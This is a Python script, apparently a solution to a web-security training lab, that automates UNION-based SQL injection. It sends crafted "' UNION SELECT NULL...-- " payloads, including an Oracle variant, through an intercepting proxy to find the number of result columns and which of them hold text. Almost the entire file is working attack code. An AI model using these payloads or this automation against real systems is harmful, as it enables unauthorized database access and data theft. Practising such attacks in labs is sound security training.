import sys
import argparse
import re
import logging
import urllib3
import requests
import string

PROXIES = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}

AVAIL_CHARS = string.printable

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{", 
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def parse_args(args: list):
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-n", "--no-proxy", default=False, action="store_true", help="do not use proxy"
    )
    parser.add_argument("url", help="url of lab")
    return parser.parse_args() 

def normalize_url(url):
    if not url.endswith("/"):
        url = url + "/"
    return url

def determine_number_of_columns(url, no_proxy, oracle=False):
    log.info("Determining number of columns")
    nulls_list=["NULL"]
    num_columns = None
    while len(nulls_list) < 20:
        nulls = ",".join(nulls_list)
        if oracle:
            category = f"' UNION SELECT {nulls} FROM dual-- "
        else:
            category = f"' UNION SELECT {nulls}-- "
        exploit_url = url + category
        if no_proxy: 
            resp = requests.get(exploit_url)
        else: 
            resp = requests.get(exploit_url, proxies=PROXIES, verify=False)
        if resp.status_code == 200:
            num_columns = len(nulls_list)
            break
        nulls_list.append("NULL")
    if num_columns:
        log.info(f"number of columns if: {num_columns}")
    return num_columns


def determine_text_columns(url, no_proxy, num_columns, oracle=False):
    text_columns = []
    for i in range(0, num_columns):
        nulls_list = ["NULL"] * num_columns
        nulls_list[i] = "'a'"
        nulls = ",".join(nulls_list)
        if oracle:
            category = f"' UNION SELECT {nulls} FROM dual-- "
        else:
            category = f"' UNION SELECT {nulls}-- "
        exploit_url = url + category
        if no_proxy: 
            resp = requests.get(exploit_url)
        else: 
            resp = requests.get(exploit_url, proxies=PROXIES, verify=False)
        if resp.status_code == 200:
            text_columns.append(i)
    if text_columns:
        text_columns_str = ", ".join(map(str, text_columns))
        log.info(f"The text columns are: {text_columns_str}")
    return text_columns
